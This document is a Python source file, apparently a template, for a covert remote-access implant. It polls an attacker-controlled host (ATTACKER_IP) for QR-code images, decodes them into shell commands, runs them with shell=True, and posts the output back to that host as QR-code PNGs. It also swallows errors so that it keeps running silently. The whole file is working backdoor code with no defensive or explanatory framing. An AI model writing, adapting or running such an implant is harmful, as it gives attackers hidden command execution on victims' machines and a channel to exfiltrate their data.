import requests
import subprocess
import time
from PIL import Image
from io import BytesIO
import qrcode
import pyzbar.pyzbar as pyzbar

ATTACKER_IP = "{attacker_ip}"
PORT = {port}
POLL_INTERVAL = 3
CHUNK_SIZE = 1000  

def encode_to_qr(data):
    qr = qrcode.QRCode(error_correction=qrcode.constants.ERROR_CORRECT_L)
    qr.add_data(data)
    qr.make(fit=True)
    return qr.make_image(fill="black", back_color="white")

def decode_qr(image_data):
    try:
        img = Image.open(BytesIO(image_data))
        decoded = pyzbar.decode(img)
        if decoded:
            return decoded[0].data.decode("utf-8")
    except Exception:
        return None

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout or result.stderr
    except Exception as e:
        return f"Error: {e}"

def send_output(output, result_index):
    chunks = [output[i:i + CHUNK_SIZE] for i in range(0, len(output), CHUNK_SIZE)]
    for idx, chunk in enumerate(chunks):
        qr_output = encode_to_qr(chunk)
        buffer = BytesIO()
        qr_output.save(buffer, format="PNG")
        result_url = f"http://{ATTACKER_IP}:{PORT}/result{result_index}_{idx}.png"
        requests.post(result_url, data=buffer.getvalue(), headers={"Content-Type": "image/png"})

def main():
    command_index = 0
    result_index = 0

    while True:
        try:
            url = f"http://{ATTACKER_IP}:{PORT}/command{command_index}.png"
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                command = decode_qr(response.content)

                if command:
                    output = execute_command(command)
                    send_output(output, result_index)
                    result_index += 1
                    command_index += 1
            else:
                time.sleep(POLL_INTERVAL)
        except Exception:
            time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    try:
        main()
    except Exception:
        pass
